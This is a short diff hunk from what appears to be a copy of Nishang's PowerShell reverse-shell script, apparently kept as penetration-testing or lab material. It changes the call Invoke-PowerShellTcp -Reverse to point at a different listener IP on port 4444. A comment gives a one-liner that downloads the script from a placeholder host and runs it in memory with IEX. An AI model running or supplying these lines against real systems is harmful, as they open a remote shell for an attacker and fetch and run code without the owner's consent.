@@ -125,7 +125,7 @@ https://github.com/samratashok/nishang
     }
 }
 # Update IP and PORT
-Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.184 -Port 4444
 
 # Call it with
 # powershell IEX(New-Object Net.WebClient).downloadString("http://ip-here/PS.ps1")
